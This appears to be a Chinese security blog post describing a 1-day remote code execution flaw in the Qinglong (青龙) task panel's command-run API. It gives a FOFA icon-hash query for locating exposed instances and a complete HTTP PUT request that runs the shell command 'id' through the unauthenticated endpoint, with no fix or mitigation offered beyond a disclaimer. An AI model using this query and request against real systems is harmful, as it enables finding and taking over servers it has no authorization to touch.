#  【1day】青龙面板 网站管理系统 command-run 远程代码执行漏洞  
原创 PocketSec
                    PocketSec  PocketSec   2026-03-04 03:47  
  
使用说明：本文章仅用于学习技术研究，请勿用于违法用途，造成任何后果自负与本人无关，请自觉遵守国家法律法规。  
# 一、漏洞简介  
  
青龙面板是一款基于 Web 的自动化任务管理与网站资源管理工具，主要用于：  
- 定时任务调度  
  
- 脚本执行管理  
  
- 容器环境运维  
  
- 自动化部署与运行维护  
  
由于其核心功能包含“在线执行命令”，若接口鉴权或参数过滤存在缺陷，则可能导致  
远程代码执行（RCE）风险。  
  
本次漏洞出现在 command-run功能模块  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jnPibeQzxbBZONzhkzMKEtBZjB9iaj3mAuBicuNM72YBU86H0Km8BnlRE6PYousZWFqTXiaVomTbs87IOyYW5DmHmm3B8q7ZSxiawiaaJKUOAG4CU/640?wx_fmt=png&from=appmsg "")  
# 二、资产测绘  
```
fofa:icon_hash=="-254502902"
```  
# 三、漏洞复现  
  
```
PUT /API/system/command-run HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Length: 17
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Content-Type: application/json
Dnt: 1
Upgrade-Insecure-Requests: 1
{"command": "id"}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jnPibeQzxbBajz8F4EiaGBdnibJTKOWpZkAIygWUj6LZpsojDwnEyicDicbE5azxxC9Pjs6liaQChX3bnJribtUoxbXR0aQ8b73icqSsvLGRJ697qco/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jnPibeQzxbBaB4ia92sdHnVq9KMqPoMa7VhcgVCml3wshrqpPpOT8vdWYKJic3hw5G6pTaM0JD3L6fibAf0qEuZHicWYDS2IpzcVgVNibHZYbGl8g/640?wx_fmt=png&from=appmsg "")  
  
